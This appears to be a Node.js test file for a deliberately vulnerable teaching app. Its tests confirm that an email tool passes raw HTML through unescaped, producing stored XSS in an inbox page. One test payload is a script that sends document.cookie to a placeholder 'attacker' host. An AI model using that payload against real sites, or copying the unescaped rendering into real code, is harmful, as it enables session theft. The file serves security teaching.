const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability xss-stored-email
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/email/tools/index.js
 * @location client/src/pages/secureshop/pages/Inbox.jsx
 *
 * email.send renders body_markdown → body_html through the intentionally
 * vulnerable `_unsafeMarkdownToHtml` helper (marked was replaced because
 * v9+ escapes inline HTML by default, which silently neuters the demo).
 * Raw <script> and <img onerror> pass through verbatim. Inbox.jsx uses
 * dangerouslySetInnerHTML → stored XSS on inbox load.
 */
test('xss-stored-email: body_markdown <script> renders into body_html verbatim', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { send } = require(path.join(REPO, 'agent-host/agents/email/tools/index.js'));
    const r = await send({
      to: 'alice@shop.local',
      subject: 'gotcha',
      body_markdown: `Hello **friend**\n\n<script>fetch('http://attacker/?c='+document.cookie)</script>`,
      from: 'x@ext',
    });
    assert.equal(r.ok, true);
    assert.match(r.body_html, /<script>fetch\('http:\/\/attacker/, 'raw script must survive');
    assert.ok(!/&lt;script&gt;/.test(r.body_html), 'script tag must not be HTML-escaped');
  } finally {
    await s.close();
  }
});

test('xss-stored-email: body_markdown <img onerror> survives verbatim (Playwright regression)', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { send } = require(path.join(REPO, 'agent-host/agents/email/tools/index.js'));
    const payload = `<img src=x onerror=window.__pwn_email=1>`;
    const r = await send({
      to: 'alice@shop.local',
      subject: 'XSS Test',
      body_markdown: payload,
      from: 'attacker@evil.local',
    });
    assert.equal(r.ok, true);
    // Regression guard against Wave 3B finding: marked v9+ escapes standalone
    // <img> paragraphs to `&lt;img …&gt;`. The custom `_unsafeMarkdownToHtml`
    // in send() must NOT escape this payload.
    assert.ok(
      r.body_html.includes(payload),
      `body_html must contain the raw payload verbatim, got: ${r.body_html}`,
    );
    assert.ok(!/&lt;img/.test(r.body_html), 'img tag must not be HTML-escaped');
  } finally {
    await s.close();
  }
});

test('xss-stored-email: body_html round-trips through DB unchanged', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { send } = require(path.join(REPO, 'agent-host/agents/email/tools/index.js'));
    const payload = `<img src=x onerror=window.__pwn_email=1>`;
    const sent = await send({
      to: 'alice@shop.local',
      subject: 'XSS Test',
      body_markdown: payload,
      from: 'attacker@evil.local',
    });
    // Read back what's actually stored in DB — this is what Inbox.jsx renders.
    const { rows: [row] } = await s.query(`SELECT body_html FROM secureshop.emails WHERE id = $1`, [sent.email_id]);
    assert.ok(
      row.body_html.includes(payload),
      `DB.body_html must contain raw payload for stored XSS. Got: ${row.body_html}`,
    );
  } finally {
    await s.close();
  }
});
